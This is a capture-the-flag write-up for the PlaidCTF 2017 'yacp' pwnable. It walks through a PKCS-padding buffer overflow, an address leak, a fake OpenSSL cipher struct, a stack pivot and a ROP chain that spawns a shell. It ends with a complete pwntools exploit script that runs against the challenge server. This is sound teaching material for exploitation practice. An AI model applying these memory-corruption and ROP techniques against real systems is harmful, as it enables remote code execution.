[writeup by @abiondo]

**CTF:** PlaidCTF 2017

**Team:** spritzers (from [SPRITZ Research Group](http://spritz.math.unipd.it/))

**Task:** pwnable/yacp

**Points:** 300

```
What’s this? Yet another crypto problem?
You’ve got to be kidding me!
Running at yacp.chal.pwning.xxx:7961
```

## The bug

We're given a stripped 32-bit Linux ELF, along with the dynamic libraries it uses (libc and libcrypto). `checksec.sh` shows partial RELRO, stack canary, NX and no PIE.

When running the binary without arguments we're presented with a proof-of-work challenge that's used on the remote side. We can skip this by providing an argument and we'll worry about it later.

```
$ LD_LIBRARY_PATH=. ./yacp foo
Welcome to the cryptotool!
Because apparently, you can never have too much crypto!

What would you like to do?
0. Load data
1. Generate random data
2. Hash data
3. Encrypt data
4. Decrypt data
5. Display data
```

This tool has 32 2kB buffers (numbered 0 - 31) that you can read (option 5) and write (option 0). You can also perform crypto operations on those buffers. For example, an interaction for option 3 or 4 would go something like this:

```
What type of cipher would you like to perform?
aes128
For your input, Which buffer (0-31) would you like to use?
0
For your output, Which buffer (0-31) would you like to use?
1
For your key, Which buffer (0-31) would you like to use?
2
For an IV (use any buffer if not needed) Which buffer (0-31) would you like to use?
3
```

So we have control over all aspects of the crypto operation. The cipher name can be anything libcrypto supports (`openssl list-cipher-algorithms`), as the cipher is obtained via `EVP_get_cipherbyname`.

The buffers are stored in the BSS with this layout:

```c
char buffer[32][2048]; // @ 0x0804c0e0
int buffer_size[32]; // @ 0x0805c0e0
```

Where `buffer_size[i]` contains the actual length of the data stored in `buffer[i]`. This size field is set when a buffer is written and then used when a buffer is read.

There doesn't seem to be an obvious overflow (the checks look good), but I notice that encryption and decryption routines do not perform any check on the output size. Since input and output have the same size, this looks safe on first glance. The output size of a block cipher is tipically the input size padded to be aligned to the block size of the cipher. The maximum buffer size (2kB) is aligned to the block size of any cipher I know of, so an overflow due to padding should never occur. However, libcrypto uses PKCS padding by default. If the input size is already aligned to the block size, an additional whole output block of padding is added. This means that if we completely fill the 2kB input buffer, we'll get a 2kB + padding block write to the output buffer, so the encrypted padding overflows.

## Primitive #1: `buffer_size[0]` control

An obvious target for the overflow is the last buffer. The padding block will overwrite the first elements of `buffer_size`. If we can control a buffer size we should be able to leverage it into BSS read/write primitives.

To control the size we need to find a cipher/key combination that will encrypt a block of PKCS padding to our desired size. This is equivalent to a known-plaintext attack. I'm not that good with crypto, so I ended up choosing a cipher and bruteforcing a key, which took too long for an exact size. However, by relaxing the constraints I was able to bruteforce a "good enough" size, which we'll use to perform a second overflow and obtain accurate size control.

```
Cipher: des-ecb
Key : 0e ac 44 3a 41 41 41 41
Ptxt: 08 08 08 08 08 08 08 08
Ctxt: 08 50 00 00 3e 94 31 26
```

By encrypting any 2kB input into the last buffer with this key we'll corrupt `buffer_size[0]` to 20488, i.e. `10*2048 + 8`. `buffer_size[1]` will be corrupted with junk, but we don't care about it (couldn't find a cipher with 32-bit block size). This makes encryption and decryption operations that use buffer 0 as input vulnerable to overflows into data after `buffer`, because the input size is greater than 2kB. We leverage this into arbitrary control over `buffer_size[0]`:

1. Prepare an encrypted payload of `10*2048` junk bytes, followed by 4 bytes of desired value for `buffer_size[0]`, followed by 4 bytes of junk padding to align to block size (for some reason PKCS doesn't seem to work properly, so let's not bother, we don't care about `buffer_size[1]` anyway);
2. Load the payload contiguously into the buffers from 0 to 10;
3. Issue an encryption of a full buffer (e.g. 0) into buffer 31 with the bruteforced key, which will corrupt `buffer_size[0]` to 20488;
4. Issue a decryption of buffer 0 into buffer 22 with the payload key, which will overflow our desired value into `buffer_size[0]`.

Later we'll need to put other data at the beginning of `buffer[0]`, and we can't use option 0 because it'll reset the size. In that case the payload (before encryption) is made of the data padded to `10*2048` bytes, followed by desired size and padding. The payload can be encrypted with any key, which will come in handy later.

## Primitive #2: BSS read

We can build a read primitive on top of #1. To read `n` bytes at a positive offset `off` from `buffer`:

1. Use primitive #1 to set `buffer_size[0] = off + n`;
2. Use the display option (5) to dump the contents of buffer 0;
3. The last `n` bytes are the desired read.

## Primitive #3: BSS write

We can build a primitive that overflows into BSS data after `buffer` on top of #1. To write `n` bytes of data at offset `off` from `buffer[32]` (corrupting everything in between and possibly a few bytes after, depending on alignment):

1. Prepare a payload made of `2048 + off` junk bytes, followed by the data we want to write, followed by junk padding to align to block size;
2. Use primitive #1 with the payload at the beginning of `buffer[0]` to set `buffer_size[0]` to the payload length;
3. Issue a decryption of buffer 0 into buffer 31, which will result in `n` data bytes (+ padding) overflowing after `off`.

## Putting everything together

We can't access the GOT since it's before BSS due to RELRO, so corrupting something inside BSS will have to do. There's an [`EVP_CIPHER_CTX`](http://docs.huihoo.com/doxygen/openssl/1.0.1c/structevp__cipher__ctx__st.html) structure in the BSS at `0x0805c178` (past the buffer). This holds the cipher context for cipher operations. It holds an [`EVP_CIPHER *`](http://docs.huihoo.com/doxygen/openssl/1.0.1c/structevp__cipher__st.html) as its first member. `EVP_CIPHER` holds function pointers that are called during cipher operations. We can create a fake `EVP_CIPHER` inside of a buffer, then use primitive #3 to manipulate the pointer inside `EVP_CIPHER_CTX` to point to our fake struct. Since our junk padding doesn't add extra blocks, we're going to get a call to `cleanup` right after the pointer overwrite, so that's what we'll use. This provides IP control.

Since NX is enabled we need to do ROP. There aren't enough gadgets in the binary, so we need to look at the libraries. Being dynamic, we need an address leak to bypass ASLR. We can't read `libc` addresses off the GOT. However, at `0x0805c208` there's the `EVP_CIPHER *` returned by `EVP_get_cipherbyname`. This points inside the data section of `libcrypto`, at a `0x1dd920` offset from its base (for `des-ecb`). We can leak it through primitive #2 and derandomize `libcrypto`. It has gadgets to build an `execve` chain (and `ropper` is able to do it automatically).

The final issue is that we don't control the stack, so we need a pivot. I found out that when `cleanup` is called `ebp` contains the address of the key buffer. This is due to OpenSSL building with `-fomit-frame-pointer` by default, so `ebp` is used as a general-purpose register. A `mov esp, ebp; pop ebp; ret;` epilogue can be found at `0x3d619` from the base. The payload for primitive #1/#3 can be encrypted with an arbitrary key, so all we need to do is put 4 junk bytes (for `pop ebp`) followed by the ROP chain into the key buffer and make `cleanup` point to the stack pivot gadget. Finally, we have a local shell!

## Proof-of-work challenge

When connecting to the remote service (and when running the binary without arguments) we're presented with a challenge:

```
Welcome to the cryptotool!
Because apparently, you can never have too much crypto!
Before we begin, please enter the magic word.
It starts with f06cd76088a3a403 and is 32 characters long.
Magic word?
```

By reversing the binary we see that the 8 hex bytes are generated randomly, while the length is always 32. To generate the magic word we have to append 16 bytes after the 16 hex digits, such that the SHA-256 hash of the word has its upper 28 bits set. This will require on average `2^28 / 2` hash calculations, which can bruteforced in a short time.

Finally, we get a remote shell:

```
[+] Opening connection to yacp.chal.pwning.xxx on port 7961: Done
[+] Solving challenge...
[+] Found magic word: c1bc9a75c1b5ec6c           !g,HF
[+] Leaked libcrypto base: 0xf757c000
[*] Switching to interactive mode
$ cat /home/yacp/flag
PCTF{porque_no_los_dos}
```

## Post-CTF considerations

After the CTF I realized this can be made much simpler:

* Instead of bruteforcing keys and overflowing encrypted PKCS padding into `buffer_size`, we can exploit the fact that `buffer_size` for the output buffer will be set to 2048 + block size, which can then be used to overflow our desired size into `buffer_size`;
* `libc` is loaded at a fixed offset before `libcrypto`, so we can derandomize `libc` using the `libcrypto` leak and call `system()`. The first argument passed to `cleanup` is the `EVP_CIPHER_CTX *`. Since `EVP_CIPHER_CTX.cipher` doesn't contain NUL bytes, we can just corrupt `EVP_CIPHER_CTX.engine` to `;sh;` to get a shell.

You live, you learn :)

## Exploit code

This has been reworked after the CTF just to make it easier to read, the exploit is the one described in this writeup (I didn't change it to the simpler way).

```python
#!/usr/bin/python2

from pwn import *
from Crypto.Cipher import DES
import itertools
import hashlib
import sys

# 08 08 08 08 08 08 08 08 -> 08 50 00 00 3e 94 31 26
CIPHER = 'des-ecb'
CORRUPT_KEY = '\x0e\xac\x44\x3a\x41\x41\x41\x41'

# Safe buffers for auxiliary data: 12-21
NUM_BUFS = 32
BUF_SIZE = 2048
BUFFER_ADDR = 0x0804c0e0

def make_choice(n):
    p.recvuntil('5. Display data\n')
    p.sendline(str(n))

def load_data(buf, data):
    make_choice(0)
    p.sendline('{}\n{}\n{}'.format(len(data), buf, data.encode('hex')))
    p.recvuntil('hex-encoded bytes\n')

def read_data(buf):
    make_choice(5)
    p.sendline('{}'.format(buf))
    p.recvuntil(') = ')
    return p.recvline().strip().decode('hex')

CRYPTO_OP_ENCRYPT = 3
CRYPTO_OP_DECRYPT = 4
def crypto_op(op, dst_buf, src_buf, key=CORRUPT_KEY):
    KEY_BUF = 12
    load_data(KEY_BUF, key)
    make_choice(op)
    p.sendline('{}\n{}\n{}\n{}\n{}'.format(CIPHER, src_buf, dst_buf, KEY_BUF, KEY_BUF))
    p.recvuntil('For an IV (use any buffer if not needed) Which buffer (0-31) would you like to use?\n')

def load_data_contig(buf, data):
    chunks = [data[i:i+BUF_SIZE] for i in range(0, len(data), BUF_SIZE)]
    for i in range(len(chunks)):
        load_data(buf + i, chunks[i])

# If len(key) > 8, uses key[:8] for payload encryption
# but still loads the full key into the key buffer
def primitive_control_buf0(size, data='', key=CORRUPT_KEY):
    CORRUPT_SIZE = 20488
    # Load payload
    data += 'A'*(CORRUPT_SIZE - 8 - len(data)) + p32(size) + 'A'*4
    des = DES.new(key[:8], DES.MODE_ECB)
    load_data_contig(0, des.encrypt(data))
    # Corrupt buffer_size[0] = 20488
    crypto_op(CRYPTO_OP_ENCRYPT, NUM_BUFS - 1, 0)
    # Control size
    crypto_op(CRYPTO_OP_DECRYPT, NUM_BUFS - CORRUPT_SIZE / BUF_SIZE, 0, key)

# addr must be >= BUFFER_ADDR
def primitive_read(addr, n):
    off = addr - BUFFER_ADDR
    primitive_control_buf0(off + n)
    return read_data(0)[off:]

# addr must be >= BUFFER_ADDR + (NUM_BUFS-1)*BUF_SIZE
def primitive_write(addr, data, key=CORRUPT_KEY):
    off = addr - BUFFER_ADDR - (NUM_BUFS-1)*BUF_SIZE
    payload  = 'A'*off + data
    payload += 'A'*(8 - len(payload) % 8) if len(payload) % 8 != 0 else ''
    primitive_control_buf0(len(payload), payload, key)
    crypto_op(CRYPTO_OP_DECRYPT, NUM_BUFS - 1, 0, key)

def build_fake_evp_cipher(cleanup):
    # EVP_CIPHER.nid = 0x1d
    evp_cipher  = p32(0x1d)
    # EVP_CIPHER.block_size = 8
    evp_cipher += p32(8)
    # EVP_CIPHER.key_len = 8
    evp_cipher += p32(8)
    # EVP_CIPHER.iv_len = 0
    evp_cipher += p32(0)
    # EVP_CIPHER.flags = 0x201
    evp_cipher += p32(0x201)
    # EVP_CIPHER.init = junk
    evp_cipher += p32(0xdeadbeef)
    # EVP_CIPHER.do_cipher = junk
    evp_cipher += p32(0xdeadbeef)
    # EVP_CIPHER.cleanup = cleanup
    evp_cipher += p32(cleanup)
    # EVP_CIPHER.ctx_size = 0x84
    evp_cipher += p32(0x84)
    # EVP_CIPHER.set_asn1_parameters = junk
    evp_cipher += p32(0xdeadbeef)
    # EVP_CIPHER.get_asn1_parameters = junk
    evp_cipher += p32(0xdeadbeef)
    # EVP_CIPHER.ctrl = junk
    evp_cipher += p32(0xdeadbeef)
    # EVP_CIPHER.app_data = junk
    evp_cipher += p32(0xdeadbeef)
    return evp_cipher

def leak_libcrypto_base():
    EVP_CIPHER_PTR_ADDR = 0x805c208
    EVP_CIPHER_LIBCRYPTO_OFFSET = 0x1dd920
    evp_cipher_addr = u32(primitive_read(EVP_CIPHER_PTR_ADDR, 4))
    return evp_cipher_addr - EVP_CIPHER_LIBCRYPTO_OFFSET

def do_rop(rop, libcrypto_base):
    FAKE_EVP_CIPHER_BUF = 13
    FAKE_EVP_CIPHER_ADDR = BUFFER_ADDR + BUF_SIZE*FAKE_EVP_CIPHER_BUF
    GADGET_PIVOT = libcrypto_base + 0x3d619 # mov esp, ebp; pop ebp; ret;
    EVP_CIPHER_CTX_CIPHER_ADDR = 0x805c178
    # Load fake EVP_CIPHER in a buffer
    evp_cipher = build_fake_evp_cipher(GADGET_PIVOT)
    load_data(FAKE_EVP_CIPHER_BUF, evp_cipher)
    # Junk for EBP in front of ROP chain
    fake_stack = 'A'*4 + rop
    # When GADGET_PIVOT is executed ebp = key buffer
    # EVP_CIPHER_CTX.cipher = FAKE_EVP_CIPHER_ADDR
    primitive_write(EVP_CIPHER_CTX_CIPHER_ADDR, p32(FAKE_EVP_CIPHER_ADDR), fake_stack)

def do_challenge():
    p.recvuntil('It starts with ')
    prefix = p.recv(16)
    p.recvuntil('Magic word? ')
    alpha = [chr(i) for i in range(0x20, 0x7F + 1)]
    word = None
    for cand in itertools.product(alpha, repeat=16):
        cand_word = prefix + ''.join(cand)
        digest = hashlib.sha256(cand_word).digest()
        if digest[:3] == '\xff\xff\xff' and ord(digest[3]) >= 0xF0:
            word = cand_word
            break
    if word is None:
        print('[-] Cannot solve challenge')
        sys.exit(1)
    print('[+] Found magic word: {}'.format(word))
    p.sendline(word)

context(arch='i386', os='linux')
#p = process('./yacp', env={'LD_LIBRARY_PATH': '.'})
p = remote('yacp.chal.pwning.xxx', 7961)

print('[+] Solving challenge...')
do_challenge()

libcrypto_base = leak_libcrypto_base()
print('[+] Leaked libcrypto base: 0x{:08x}'.format(libcrypto_base))

rebase_0 = lambda x : p32(x + libcrypto_base)

rop  = rebase_0(0x000c9146) # 0x000c9146: pop eax; ret; 
rop += '//bi'
rop += rebase_0(0x00009328) # 0x00009328: pop edx; ret; 
rop += rebase_0(0x001e21a0)
rop += rebase_0(0x0011fdc8) # 0x0011fdc8: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x000c9146) # 0x000c9146: pop eax; ret; 
rop += 'n/sh'
rop += rebase_0(0x00009328) # 0x00009328: pop edx; ret; 
rop += rebase_0(0x001e21a4)
rop += rebase_0(0x0011fdc8) # 0x0011fdc8: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x000c9146) # 0x000c9146: pop eax; ret; 
rop += p32(0x00000000)
rop += rebase_0(0x00009328) # 0x00009328: pop edx; ret; 
rop += rebase_0(0x001e21a8)
rop += rebase_0(0x0011fdc8) # 0x0011fdc8: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x0000641e) # 0x0000641e: pop ebx; ret; 
rop += rebase_0(0x001e21a0)
rop += rebase_0(0x00004c32) # 0x00004c32: pop ecx; ret; 
rop += rebase_0(0x001e21a8)
rop += rebase_0(0x00009328) # 0x00009328: pop edx; ret; 
rop += rebase_0(0x001e21a8)
rop += rebase_0(0x000c9146) # 0x000c9146: pop eax; ret; 
rop += p32(0x0000000b)
rop += rebase_0(0x0014d146) # 0x0014d146: int 0x80;

do_rop(rop, libcrypto_base)

p.interactive()
```
